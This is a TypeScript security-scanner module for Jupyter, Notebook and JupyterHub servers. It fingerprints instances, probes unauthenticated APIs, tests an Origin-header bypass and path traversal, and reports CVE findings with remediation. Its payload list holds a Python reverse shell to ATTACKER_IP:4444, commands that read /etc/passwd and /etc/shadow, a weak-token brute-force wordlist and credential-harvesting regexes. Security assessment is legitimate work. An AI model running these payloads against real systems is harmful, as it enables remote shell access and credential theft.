/**
 * Jupyter Notebook Security Scanner
 * ──────────────────────────────────
 * Detects and tests Jupyter-specific attack vectors:
 * - Unauthenticated kernel access (RCE)
 * - Token/password brute-force
 * - Notebook file exposure (.ipynb with credentials)
 * - Exposed API endpoints (/api/kernels, /api/contents)
 * - JupyterHub multi-user privilege escalation
 * - Known CVEs (CVE-2024-22421, CVE-2023-40170, etc.)
 * - Kernel gateway abuse
 * - nbconvert SSRF/code execution
 *
 * @module jupyter-scanner
 */

// ─── Types ───────────────────────────────────────────────────────────────────

export type JupyterVulnCategory =
  | "unauthenticated_access"
  | "token_exposure"
  | "kernel_rce"
  | "notebook_file_exposure"
  | "api_endpoint_exposure"
  | "privilege_escalation"
  | "known_cve"
  | "credential_disclosure"
  | "nbconvert_abuse"
  | "websocket_hijack"
  | "information_disclosure";

export type Severity = "critical" | "high" | "medium" | "low" | "info";

export interface JupyterFinding {
  id: string;
  category: JupyterVulnCategory;
  severity: Severity;
  title: string;
  description: string;
  evidence: string;
  remediation: string;
  cwe?: string;
  cve?: string;
  mitreTechnique?: string;
}

export interface JupyterTarget {
  url: string;
  port?: number;
  type?: "notebook" | "lab" | "hub" | "kernel_gateway";
  version?: string;
}

export interface JupyterScanResult {
  target: JupyterTarget;
  findings: JupyterFinding[];
  fingerprint: JupyterFingerprint | null;
  scanDuration: number;
  timestamp: string;
}

export interface JupyterFingerprint {
  type: "notebook" | "lab" | "hub" | "kernel_gateway" | "unknown";
  version: string | null;
  pythonVersion: string | null;
  hasAuth: boolean;
  authType: "token" | "password" | "oauth" | "none" | "unknown";
  runningKernels: number;
  exposedEndpoints: string[];
  serverHeaders: Record<string, string>;
  hubVersion?: string;
}

// ─── Known CVEs ──────────────────────────────────────────────────────────────

export const JUPYTER_CVES: Array<{
  id: string;
  affectedVersions: string;
  severity: Severity;
  title: string;
  description: string;
  component: string;
  testMethod: string;
}> = [
  {
    id: "CVE-2024-22421",
    affectedVersions: "< 7.0.7",
    severity: "critical",
    title: "Unauthenticated API Access via Origin Bypass",
    description: "Jupyter Server allows unauthenticated access to the API by spoofing the Origin header, bypassing CORS and authentication checks.",
    component: "jupyter-server",
    testMethod: "Send API requests with Origin: http://localhost:8888 header",
  },
  {
    id: "CVE-2023-40170",
    affectedVersions: "< 2.7.2",
    severity: "high",
    title: "Cross-Site Request Forgery in Jupyter Server",
    description: "Jupyter Server does not properly validate CSRF tokens for certain API endpoints, allowing cross-site request forgery attacks.",
    component: "jupyter-server",
    testMethod: "Craft CSRF payload targeting /api/kernels POST endpoint",
  },
  {
    id: "CVE-2024-35178",
    affectedVersions: "< 2.14.1",
    severity: "high",
    title: "Arbitrary File Read via Contents API",
    description: "The /api/contents endpoint allows reading files outside the notebook root directory via path traversal.",
    component: "jupyter-server",
    testMethod: "GET /api/contents/../../../etc/passwd",
  },
  {
    id: "CVE-2023-44461",
    affectedVersions: "< 4.0.7",
    severity: "medium",
    title: "JupyterHub Open Redirect",
    description: "JupyterHub's login page is vulnerable to open redirect via the next parameter, enabling phishing attacks.",
    component: "jupyterhub",
    testMethod: "GET /hub/login?next=http://evil.com",
  },
  {
    id: "CVE-2024-28233",
    affectedVersions: "< 4.1.0",
    severity: "high",
    title: "JupyterHub XSS via User Spawn Page",
    description: "JupyterHub's spawn page reflects user-controlled input without proper sanitization, enabling stored XSS.",
    component: "jupyterhub",
    testMethod: "Create user with XSS payload in username/server name",
  },
  {
    id: "CVE-2023-39968",
    affectedVersions: "< 6.5.5",
    severity: "medium",
    title: "Notebook Server Open Redirect",
    description: "Classic Jupyter Notebook server allows open redirects via crafted URLs in the login flow.",
    component: "notebook",
    testMethod: "GET /login?next=%2F%2Fevil.com",
  },
];

// ─── Fingerprinting ──────────────────────────────────────────────────────────

/**
 * Fingerprint a Jupyter instance to determine type, version, and attack surface.
 */
export function fingerprintJupyter(
  responseHeaders: Record<string, string>,
  htmlBody: string,
  apiResponse?: string
): JupyterFingerprint {
  const type = detectJupyterType(responseHeaders, htmlBody);
  const version = extractJupyterVersion(responseHeaders, htmlBody, apiResponse);

  return {
    type,
    version,
    pythonVersion: extractPythonVersion(apiResponse),
    hasAuth: detectAuthentication(responseHeaders, htmlBody),
    authType: detectAuthType(responseHeaders, htmlBody),
    runningKernels: countRunningKernels(apiResponse),
    exposedEndpoints: [],
    serverHeaders: responseHeaders,
  };
}

function detectJupyterType(
  headers: Record<string, string>,
  html: string
): "notebook" | "lab" | "hub" | "kernel_gateway" | "unknown" {
  if (html.includes("jupyterhub") || html.includes("/hub/")) return "hub";
  if (html.includes("jupyterlab") || html.includes("/lab")) return "lab";
  if (html.includes("kernel_gateway") || headers["server"]?.includes("KernelGateway")) return "kernel_gateway";
  if (html.includes("notebook") || html.includes("/tree")) return "notebook";
  return "unknown";
}

function extractJupyterVersion(
  headers: Record<string, string>,
  html: string,
  apiResponse?: string
): string | null {
  // Check server header
  const serverHeader = headers["server"] || "";
  const serverMatch = serverHeader.match(/(?:Jupyter|notebook)\s*\/?\s*(\d+\.\d+\.\d+)/i);
  if (serverMatch) return serverMatch[1];

  // Check API response
  if (apiResponse) {
    const apiMatch = apiResponse.match(/"version"\s*:\s*"([^"]+)"/);
    if (apiMatch) return apiMatch[1];
  }

  // Check HTML meta/script tags
  const htmlMatch = html.match(/jupyter[_-]?(?:server|notebook|lab)[\/\-](\d+\.\d+\.\d+)/i);
  return htmlMatch ? htmlMatch[1] : null;
}

function extractPythonVersion(apiResponse?: string): string | null {
  if (!apiResponse) return null;
  const match = apiResponse.match(/"python_version"\s*:\s*"([^"]+)"/);
  return match ? match[1] : null;
}

function detectAuthentication(headers: Record<string, string>, html: string): boolean {
  if (html.includes("password_input") || html.includes("token")) return true;
  if (headers["www-authenticate"]) return true;
  if (html.includes("/login")) return true;
  return false;
}

function detectAuthType(
  headers: Record<string, string>,
  html: string
): "token" | "password" | "oauth" | "none" | "unknown" {
  if (html.includes("token") && html.includes("login")) return "token";
  if (html.includes("password")) return "password";
  if (html.includes("oauth") || html.includes("OAuth")) return "oauth";
  if (!detectAuthentication(headers, html)) return "none";
  return "unknown";
}

function countRunningKernels(apiResponse?: string): number {
  if (!apiResponse) return 0;
  try {
    const data = JSON.parse(apiResponse);
    if (Array.isArray(data)) return data.length;
  } catch { /* not valid JSON */ }
  return 0;
}

// ─── Attack Payloads ─────────────────────────────────────────────────────────

export const JUPYTER_PAYLOADS = {
  kernel_execution: [
    // Python RCE payloads for kernel execution
    'import os; os.system("id")',
    'import subprocess; subprocess.check_output(["whoami"])',
    '__import__("os").popen("cat /etc/passwd").read()',
    'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])',
    'exec(compile(open("/etc/passwd").read(),"<string>","exec"))',
  ],
  token_wordlist: [
    // Common default/weak tokens
    "",
    "token",
    "jupyter",
    "password",
    "admin",
    "notebook",
    "test",
    "default",
    "changeme",
    "secret",
  ],
  api_endpoints: [
    "/api",
    "/api/kernels",
    "/api/kernelspecs",
    "/api/sessions",
    "/api/contents",
    "/api/terminals",
    "/api/config",
    "/api/nbconvert",
    "/api/status",
    "/api/spec.yaml",
    "/api/me",
    "/hub/api/users",
    "/hub/api/groups",
    "/hub/api/services",
    "/user-redirect/",
  ],
  path_traversal: [
    "/api/contents/../../../etc/passwd",
    "/api/contents/..%2F..%2F..%2Fetc%2Fpasswd",
    "/api/contents/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/files/../../../etc/shadow",
    "/notebooks/../../../etc/passwd",
  ],
  origin_bypass: [
    "http://localhost:8888",
    "http://127.0.0.1:8888",
    "http://0.0.0.0:8888",
    "http://[::1]:8888",
    "null",
  ],
  notebook_credential_patterns: [
    /(?:api[_-]?key|apikey)\s*[=:]\s*['"]([^'"]+)['"]/gi,
    /(?:password|passwd|pwd)\s*[=:]\s*['"]([^'"]+)['"]/gi,
    /(?:secret|token)\s*[=:]\s*['"]([^'"]+)['"]/gi,
    /(?:AWS_ACCESS_KEY_ID|aws_access_key_id)\s*[=:]\s*['"]([^'"]+)['"]/gi,
    /(?:AWS_SECRET_ACCESS_KEY|aws_secret_access_key)\s*[=:]\s*['"]([^'"]+)['"]/gi,
    /(?:DATABASE_URL|MONGO_URI|REDIS_URL)\s*[=:]\s*['"]([^'"]+)['"]/gi,
  ],
};

// ─── Scan Execution ──────────────────────────────────────────────────────────

/**
 * Execute a comprehensive Jupyter security scan against a target.
 */
export async function scanJupyterTarget(
  target: JupyterTarget,
  options: {
    fetchFn: (url: string, init?: RequestInit) => Promise<{ status: number; headers: Record<string, string>; body: string }>;
    aggressive?: boolean;
    timeout?: number;
  }
): Promise<JupyterScanResult> {
  const startTime = Date.now();
  const findings: JupyterFinding[] = [];
  const { fetchFn, aggressive = false } = options;
  const baseUrl = target.url.replace(/\/$/, "");

  // Step 1: Fingerprint
  let fingerprint: JupyterFingerprint | null = null;
  try {
    const mainPage = await fetchFn(baseUrl);
    const apiResp = await fetchFn(`${baseUrl}/api`).catch(() => null);
    fingerprint = fingerprintJupyter(mainPage.headers, mainPage.body, apiResp?.body);
  } catch {
    // Target unreachable
  }

  // Step 2: Check unauthenticated API access
  for (const endpoint of JUPYTER_PAYLOADS.api_endpoints) {
    try {
      const resp = await fetchFn(`${baseUrl}${endpoint}`);
      if (resp.status === 200) {
        if (fingerprint) fingerprint.exposedEndpoints.push(endpoint);

        if (endpoint === "/api/kernels" || endpoint === "/api/sessions") {
          findings.push({
            id: "JUPYTER-001",
            category: "unauthenticated_access",
            severity: "critical",
            title: `Unauthenticated Access to ${endpoint}`,
            description: `The Jupyter API endpoint ${endpoint} is accessible without authentication. This allows arbitrary code execution via kernel creation and message injection.`,
            evidence: `GET ${endpoint} returned 200: ${resp.body.substring(0, 300)}`,
            remediation: "Enable token or password authentication. Set c.ServerApp.token or c.ServerApp.password in jupyter_server_config.py. Never expose Jupyter to the public internet without authentication.",
            cwe: "CWE-306",
            mitreTechnique: "T1059.006",
          });
        } else if (endpoint === "/api/contents") {
          findings.push({
            id: "JUPYTER-002",
            category: "notebook_file_exposure",
            severity: "high",
            title: "Notebook Contents API Accessible",
            description: "The /api/contents endpoint is accessible, allowing enumeration and download of all notebook files which may contain credentials, proprietary code, and data.",
            evidence: `GET /api/contents returned 200: ${resp.body.substring(0, 300)}`,
            remediation: "Restrict API access with authentication. Review notebooks for hardcoded credentials before deployment.",
            cwe: "CWE-200",
            mitreTechnique: "T1005",
          });
        } else if (endpoint === "/api/terminals") {
          findings.push({
            id: "JUPYTER-003",
            category: "kernel_rce",
            severity: "critical",
            title: "Terminal API Accessible — Direct Shell Access",
            description: "The /api/terminals endpoint is accessible without authentication, allowing creation of terminal sessions with full shell access to the server.",
            evidence: `GET /api/terminals returned 200: ${resp.body.substring(0, 200)}`,
            remediation: "Disable terminal access in production (c.ServerApp.terminals_enabled = False) or ensure strong authentication is enforced.",
            cwe: "CWE-78",
            mitreTechnique: "T1059",
          });
        } else if (endpoint.includes("/hub/api/users")) {
          findings.push({
            id: "JUPYTER-004",
            category: "privilege_escalation",
            severity: "high",
            title: "JupyterHub Users API Accessible",
            description: "The JupyterHub admin API for user management is accessible, potentially allowing user enumeration, creation of admin accounts, or access to other users' servers.",
            evidence: `GET ${endpoint} returned 200: ${resp.body.substring(0, 300)}`,
            remediation: "Restrict Hub admin API access. Use JupyterHub roles and scopes to limit API token permissions.",
            cwe: "CWE-269",
            mitreTechnique: "T1078",
          });
        }
      }
    } catch { /* not accessible */ }
  }

  // Step 3: Origin bypass check (CVE-2024-22421)
  for (const origin of JUPYTER_PAYLOADS.origin_bypass) {
    try {
      const resp = await fetchFn(`${baseUrl}/api/kernels`, {
        headers: { Origin: origin } as any,
      });
      if (resp.status === 200) {
        findings.push({
          id: "JUPYTER-005",
          category: "known_cve",
          severity: "critical",
          title: "CVE-2024-22421: Authentication Bypass via Origin Header",
          description: `Jupyter Server authentication can be bypassed by spoofing the Origin header to ${origin}. This grants full unauthenticated API access including kernel execution.`,
          evidence: `GET /api/kernels with Origin: ${origin} returned 200`,
          remediation: "Upgrade Jupyter Server to >= 7.0.7. Configure c.ServerApp.allow_origin to restrict allowed origins.",
          cwe: "CWE-287",
          cve: "CVE-2024-22421",
          mitreTechnique: "T1190",
        });
        break;
      }
    } catch { /* not accessible */ }
  }

  // Step 4: Path traversal via Contents API
  if (aggressive) {
    for (const path of JUPYTER_PAYLOADS.path_traversal) {
      try {
        const resp = await fetchFn(`${baseUrl}${path}`);
        if (resp.status === 200 && (resp.body.includes("root:") || resp.body.includes("content"))) {
          findings.push({
            id: "JUPYTER-006",
            category: "notebook_file_exposure",
            severity: "critical",
            title: "Path Traversal via Contents API",
            description: `The Contents API is vulnerable to path traversal, allowing reading of arbitrary files on the server filesystem.`,
            evidence: `GET ${path} returned 200: ${resp.body.substring(0, 200)}`,
            remediation: "Upgrade Jupyter Server to the latest version. Implement path validation in the contents manager.",
            cwe: "CWE-22",
            cve: "CVE-2024-35178",
            mitreTechnique: "T1005",
          });
          break;
        }
      } catch { /* not accessible */ }
    }
  }

  // Step 5: Check for known CVEs based on version
  if (fingerprint?.version) {
    for (const cve of JUPYTER_CVES) {
      if (isVersionAffected(fingerprint.version, cve.affectedVersions)) {
        // Don't duplicate if already found via active testing
        if (!findings.some(f => f.cve === cve.id)) {
          findings.push({
            id: `JUPYTER-CVE-${cve.id}`,
            category: "known_cve",
            severity: cve.severity,
            title: `${cve.id}: ${cve.title}`,
            description: `${cve.description} Detected version ${fingerprint.version} (${cve.component}) is within affected range ${cve.affectedVersions}.`,
            evidence: `Version ${fingerprint.version} detected. Component: ${cve.component}. Test method: ${cve.testMethod}`,
            remediation: `Upgrade ${cve.component} to the latest version.`,
            cwe: "CWE-1395",
            cve: cve.id,
          });
        }
      }
    }
  }

  // Step 6: Token/auth weakness assessment
  if (fingerprint && fingerprint.authType === "none") {
    findings.push({
      id: "JUPYTER-007",
      category: "unauthenticated_access",
      severity: "critical",
      title: "No Authentication Configured",
      description: "The Jupyter instance has no authentication mechanism configured. Any user with network access can execute arbitrary code via kernel creation.",
      evidence: `No authentication detected. Auth type: none. Instance type: ${fingerprint.type}`,
      remediation: "Set a strong token: c.ServerApp.token = '<random-token>'. For multi-user environments, deploy JupyterHub with OAuth authentication. Never expose unauthenticated Jupyter to the network.",
      cwe: "CWE-306",
      mitreTechnique: "T1059.006",
    });
  } else if (fingerprint && fingerprint.authType === "token") {
    findings.push({
      id: "JUPYTER-008",
      category: "token_exposure",
      severity: "medium",
      title: "Token-Based Authentication — Brute Force Risk",
      description: "The Jupyter instance uses token-based authentication. If the token is weak, short, or exposed in logs/URLs, it can be brute-forced or intercepted.",
      evidence: `Token auth detected. Common weak tokens to test: ${JUPYTER_PAYLOADS.token_wordlist.slice(0, 5).join(", ")}`,
      remediation: "Use a cryptographically random token of at least 48 characters. Avoid passing tokens in URLs. Enable rate limiting on the login endpoint.",
      cwe: "CWE-521",
      mitreTechnique: "T1110",
    });
  }

  // Step 7: Running kernels assessment
  if (fingerprint && fingerprint.runningKernels > 0) {
    findings.push({
      id: "JUPYTER-009",
      category: "kernel_rce",
      severity: "info",
      title: `${fingerprint.runningKernels} Active Kernel(s) Detected`,
      description: `The instance has ${fingerprint.runningKernels} running kernel(s). Active kernels may contain sensitive data in memory (variables, credentials, API responses).`,
      evidence: `Running kernels: ${fingerprint.runningKernels}`,
      remediation: "Implement kernel idle timeout (c.MappingKernelManager.cull_idle_timeout). Review kernel memory for sensitive data exposure.",
      cwe: "CWE-200",
    });
  }

  return {
    target,
    findings,
    fingerprint,
    scanDuration: Date.now() - startTime,
    timestamp: new Date().toISOString(),
  };
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

function isVersionAffected(version: string, affectedRange: string): boolean {
  const match = affectedRange.match(/<\s*(\d+)\.(\d+)\.(\d+)/);
  if (!match) return false;
  const [, maxMajor, maxMinor, maxPatch] = match.map(Number);
  const parts = version.split(".").map(Number);
  const [major = 0, minor = 0, patch = 0] = parts;
  if (major < maxMajor) return true;
  if (major === maxMajor && minor < maxMinor) return true;
  if (major === maxMajor && minor === maxMinor && patch < maxPatch) return true;
  return false;
}

/**
 * Generate a Jupyter-specific test plan for an engagement.
 */
export function generateJupyterTestPlan(fingerprint: JupyterFingerprint): string[] {
  const tests: string[] = [
    "Enumerate all accessible API endpoints without authentication",
    "Test Origin header bypass (CVE-2024-22421) for auth bypass",
    "Check for exposed .ipynb files containing hardcoded credentials",
    "Test path traversal via /api/contents endpoint",
    "Verify CSRF protection on state-changing API endpoints",
  ];

  if (fingerprint.type === "hub") {
    tests.push(
      "Enumerate JupyterHub users via /hub/api/users",
      "Test JupyterHub admin API access",
      "Check for open redirect via /hub/login?next=",
      "Test cross-user server access via /user/{username}/",
      "Verify JupyterHub role-based access controls"
    );
  }

  if (fingerprint.authType === "token") {
    tests.push(
      "Brute-force token with common wordlist",
      "Check if token is exposed in server logs",
      "Check if token is passed in URL query parameters (interceptable)"
    );
  }

  if (fingerprint.runningKernels > 0) {
    tests.push(
      "Attempt to connect to existing kernels via WebSocket",
      "Dump kernel memory for sensitive variables",
      "Test kernel interrupt/restart for DoS"
    );
  }

  if (fingerprint.exposedEndpoints.includes("/api/terminals")) {
    tests.push(
      "Create terminal session and verify shell access",
      "Test terminal for privilege escalation (sudo, SUID binaries)",
      "Check terminal for container escape vectors"
    );
  }

  return tests;
}
